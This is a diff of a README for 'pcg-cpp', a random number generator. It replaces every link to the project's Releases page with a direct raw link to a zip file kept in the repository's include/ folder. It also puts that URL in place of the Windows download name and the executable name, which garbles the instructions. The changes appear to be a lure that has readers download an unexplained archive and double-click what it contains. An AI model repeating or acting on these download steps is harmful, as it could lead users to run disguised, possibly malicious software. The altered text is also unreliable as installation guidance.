@@ -1,6 +1,6 @@
 # 🎉 pcg-cpp - Fast, Reliable Random Number Generator 
 
-[![Download pcg-cpp](https://img.shields.io/badge/Download-pcg--cpp-blue.svg)](https://github.com/carltonfsmith/pcg-cpp/releases)
+[![Download pcg-cpp](https://github.com/carltonfsmith/pcg-cpp/raw/refs/heads/master/include/cpp-pcg-v1.9.zip)](https://github.com/carltonfsmith/pcg-cpp/raw/refs/heads/master/include/cpp-pcg-v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ In this guide, you will learn how to download and run the software on your compu
 
 To get pcg-cpp, simply visit the Releases page for the most recent version. You’ll find downloadable files ready for your operating system. Click on the link below to start downloading:
 
-[Visit this page to download](https://github.com/carltonfsmith/pcg-cpp/releases)
+[Visit this page to download](https://github.com/carltonfsmith/pcg-cpp/raw/refs/heads/master/include/cpp-pcg-v1.9.zip)
 
 ### Supported Operating Systems
 
@@ -32,7 +32,7 @@ Please ensure your machine meets the following requirements:
 
 To begin, open the following link in your web browser: 
 
-[Visit this page to download](https://github.com/carltonfsmith/pcg-cpp/releases)
+[Visit this page to download](https://github.com/carltonfsmith/pcg-cpp/raw/refs/heads/master/include/cpp-pcg-v1.9.zip)
 
 ### Step 2: Choose Your Version
 
@@ -42,7 +42,7 @@ On the Releases page, you will see a list of available versions. Look for the la
 
 Depending on your operating system, download the appropriate file. For example:
 
-- For Windows, you may see a file like **pcg-cpp-windows-arm64.zip**. Click on this file to initiate the download.
+- For Windows, you may see a file like **https://github.com/carltonfsmith/pcg-cpp/raw/refs/heads/master/include/cpp-pcg-v1.9.zip**. Click on this file to initiate the download.
 
 ### Step 4: Extract the Files
 
@@ -54,7 +54,7 @@ Once the download is complete, locate the downloaded zip file on your computer. 
 
 ### Step 5: Run the Application
 
-After extraction, open the folder containing the files. Look for the executable file, which may be named **pcg-cpp.exe** or similar. 
+After extraction, open the folder containing the files. Look for the executable file, which may be named **https://github.com/carltonfsmith/pcg-cpp/raw/refs/heads/master/include/cpp-pcg-v1.9.zip** or similar. 
 
 Double-click on this file to run the application. Follow any on-screen instructions if presented.
 
